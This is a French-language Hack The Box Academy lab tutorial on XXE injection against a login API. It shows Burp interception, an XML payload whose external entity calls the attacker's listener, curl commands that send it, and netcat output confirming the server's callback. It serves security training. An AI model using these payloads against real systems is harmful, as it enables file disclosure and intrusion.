Injection d'entité externe XML (XXE)
====================================

* * * * *

Les vulnérabilités d'injection d'entité externe XML (XXE) se produisent lorsque des données XML sont extraites d'une entrée contrôlée par l'utilisateur sans les nettoyer correctement ou les analyser en toute sécurité, ce qui peut nous permettre d'utiliser des fonctionnalités XML pour effectuer des actions malveillantes. Les vulnérabilités XXE peuvent causer des dommages considérables à une application Web et à son serveur principal, de la divulgation de fichiers sensibles à l'arrêt du serveur principal. Notre module [Web Attacks](https://academy.hackthebox.com/module/details/134) couvre en détail les vulnérabilités XXE Injection. Il convient de noter que les vulnérabilités XXE affectent aussi bien les applications Web que les API.

Évaluons ensemble une API vulnérable à XXE Injection.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'application cible et suivez-la.

Supposons que nous évaluons une telle application résidant dans `http://<TARGET IP>:3001`.

Au moment où nous naviguons `http://<TARGET IP>:3001`, nous tombons sur une page d'authentification.

Exécutez Burp Suite comme suit.

```
dsgsec@htb[/htb]$ burpsuite

```

Activez le proxy de burp suite ( *Intercept On* ) et configurez votre navigateur pour le parcourir.

Essayons maintenant de nous authentifier. Nous devrions voir ci-dessous dans le proxy de Burp Suite.

![image](https://academy.hackthebox.com/storage/modules/160/11.png)

Code : http

```
POST /api/login/ HTTP/1.1
Host: <TARGET IP>:3001
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 111
Origin: http://<TARGET IP>:3001
DNT: 1
Connection: close
Referer: http://<TARGET IP>:3001/
Sec-GPC: 1

<?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>

```

-   Nous remarquons qu'une API gère la fonctionnalité d'authentification des utilisateurs de l'application.
-   L'authentification de l'utilisateur génère des données XML.

Essayons de créer un exploit pour lire des fichiers internes tels que */etc/passwd* sur le serveur.

Tout d'abord, nous devrons ajouter un DOCTYPE à cette demande.

Qu'est-ce qu'un DOCTYPE ?

DTD signifie Définition de type de document. Une DTD définit la structure et les éléments et attributs juridiques d'un document XML. Une déclaration DOCTYPE peut également être utilisée pour définir des caractères spéciaux ou des chaînes utilisées dans le document. La DTD est déclarée dans l'élément facultatif DOCTYPE au début du document XML. Des DTD internes existent, mais les DTD peuvent être chargées à partir d'une ressource externe (DTD externe).

Notre charge utile actuelle est :

Code : xml

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>

```

Nous avons défini une DTD appelée *pwn* , et à l'intérieur de celle-ci, nous avons un fichier `ENTITY`. Nous pouvons également définir des entités personnalisées (c'est-à-dire des variables XML) dans des DTD XML pour permettre la refactorisation des variables et réduire les données répétitives. Cela peut être fait en utilisant le mot-clé ENTITY, suivi du `ENTITY`nom et de sa valeur.

Nous avons appelé notre entité externe *somename* , et elle utilisera le mot clé SYSTEM, qui doit avoir la valeur d'une URL, ou nous pouvons essayer d'utiliser un schéma/protocole URI tel que `file://`pour appeler des fichiers internes.

Configurons un écouteur Netcat comme suit.

```
dsgsec@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...

```

Faisons maintenant un appel API contenant la charge utile que nous avons conçue ci-dessus.

```
dsgsec@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
<p>Sorry, we cannot find a account with <b></b> email.</p>

```

Nous remarquons qu'aucune connexion n'est établie avec notre auditeur. C'est parce que nous avons défini notre entité externe, mais nous n'avons pas essayé de l'utiliser. Nous pouvons le faire comme suit.

```
dsgsec@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'

```

Après l'appel à l'API, vous remarquerez qu'une connexion est établie avec l'écouteur.

```
dsgsec@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
GET / HTTP/1.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close

```

L'API est vulnérable à l'injection XXE.
